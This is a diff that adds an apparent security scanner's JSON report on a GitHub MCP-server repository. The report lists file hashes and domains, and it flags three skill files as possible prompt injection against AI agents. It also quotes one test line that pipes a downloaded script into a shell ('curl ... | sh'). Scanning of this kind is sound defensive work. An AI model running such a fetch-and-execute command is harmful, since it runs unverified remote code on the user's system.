@@ -1,0 +1,76 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "AftabIbrahimKazi/ai-dev-kit",
+    "version": "62ab1ea2b9165600f42c86548d1201bdec3a4f72",
+    "download": "https://codeload.github.com/AftabIbrahimKazi/ai-dev-kit/tar.gz/62ab1ea2b9165600f42c86548d1201bdec3a4f72"
+  },
+  "archive_sha256": "834ca2ed0d5a709d9a4bcc094e2abbdbf5746a5fa9a5218f9d16e61c033353d0",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "ai-dev-kit-62ab1ea2b9165600f42c86548d1201bdec3a4f72/skills/commands/stale.md",
+      "line": 10,
+      "evidence": "p=0.91 For each candidate, say in one line whether the lesson was only about that file ",
+      "file_sha256": "df929e22c69db3232b6383fbf1a10c80afb98c24cabb7a9f9f00289bbd0c74b2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "ai-dev-kit-62ab1ea2b9165600f42c86548d1201bdec3a4f72/skills/memory/memory-gardener.md",
+      "line": 54,
+      "evidence": "p=0.92 This skill prunes and merges instructions that stay. It never asks whether an in",
+      "file_sha256": "7defe10a03703985990c92f6aae46df3e94faa309c9e1be61953d6f2bba9aa67"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "ai-dev-kit-62ab1ea2b9165600f42c86548d1201bdec3a4f72/skills/memory/skill-ablation.md",
+      "line": 8,
+      "evidence": "p=0.98 `memory-gardener` prunes bloat inside instructions that stay. This skill tests w",
+      "file_sha256": "18f2782038f6b656766b124858d8fb7e8db11b0e904db63f56b2ff2aa3f35264"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ai-dev-kit-62ab1ea2b9165600f42c86548d1201bdec3a4f72/mods/guard/tests/guard.test.ts",
+      "line": 25,
+      "evidence": "curl -sSL https://x.dev/i.sh | sh",
+      "file_sha256": "b93c4b3daa1cb1991859ea8bd5f59cd979f8c047437f517015ffcb2346232fce"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "ai.google.dev",
+    "api.cloudflare.com",
+    "api.github.com",
+    "cdn.example.com",
+    "download.pytorch.org",
+    "evil.example.com",
+    "example.com",
+    "figma.com",
+    "generativelanguage.googleapis.com",
+    "github.com",
+    "huggingface.co",
+    "img.shields.io",
+    "placehold.co",
+    "playwright.dev",
+    "schema.org",
+    "stitch.googleapis.com",
+    "stitch.withgoogle.com",
+    "threejsresources.com",
+    "www.cloudflare.com",
+    "www.w3.org",
+    "x.dev",
+    "x.io"
+  ],
+  "install_script": false,
+  "score": "high"
+}
